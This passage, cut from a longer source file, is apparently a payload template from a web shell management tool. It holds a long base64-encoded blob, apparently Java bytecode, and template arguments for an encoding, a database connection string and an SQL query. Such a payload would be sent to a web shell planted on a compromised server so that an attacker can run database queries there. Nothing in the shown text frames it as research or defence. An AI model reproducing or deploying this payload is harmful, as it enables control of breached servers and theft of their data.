A4wABdtQACKiwSYgO9ADW2AGErA70AN7YAOMAAXrUAA6cAek0rwQBdmQByKivAAF21AAIqtAACtgA5EmO2AGROLQS2AGUtKrQAArYAZsAAXToEGQS2ADkSZ7YAZDoFGQUEtgBlKhkFGQS2AGbAAF61AAOnAChOKiq0AAK2ADkSYgO9ADW2AGErA70AN7YAOMAAXrUAA6cABToEsQADACkAYQBkABwAdACzALYAHAC3ANYA2QAcAAEAggAAAGIAGAAAAIEACgCCABIAgwAcAIQAJgCFACkAhwAvAIgASACJAGEAnABkAIoAZQCLAGwAjAB0AI4AgQCPAIYAkACTAJEAnwCSAKUAkwCzAJoAtgCUALcAlgDWAJkA2QCXANsAngABAI8AhgABAIEAAACtAAYABQAAAHUqKrQAGbYAK00TAGgSaQa9ADVZAxMAO1NZBLIAalNZBbIAalO2AGFOLQS2AGstKrYAObYAbAa9ADdZAyxTWQQDuABtU1kFLL64AG1TtgA4wAA1OgQZBAS9ADVZAxMAKlO2AG4EvQA3WQMrU7YAP7YAb7BNK7AAAQAAAHEAcgAcAAEAggAAAB4ABwAAAKIACQCjACgApAAtAKUAVACmAHIApwBzAKgAAQCQAJEAAQCBAAAA2wAGAAYAAACPAU0SLbgALk4tEjC2ADGbAEoSMrgAMzoEGQQScAO9ADW2ADYBA70AN7YAODoFGQW2ADkScQS9ADVZAxMAKlO2ADYZBQS9ADdZAytTtgA4wAA7wAA7TacAMhJyuAAzOgQZBBJzBL0ANVkDEwAqU7YANhkEtgB0BL0AN1kDK1O2ADjAADvAADtNLLA6BAO8CLAAAQAIAIgAiQAcAAEAggAAADIADAAAAK0AAgCuAAgAsAARALEAGACyAC0AswBVALQAWAC1AF8AtgCHALgAiQC5AIsAugABAJIAAAACAJM=',
    [arg1]: '#{newbase64::encode}',
    [arg2]: '#{newbase64::conn}',
    [arg3]: '#{newbase64::sql}'
  }
})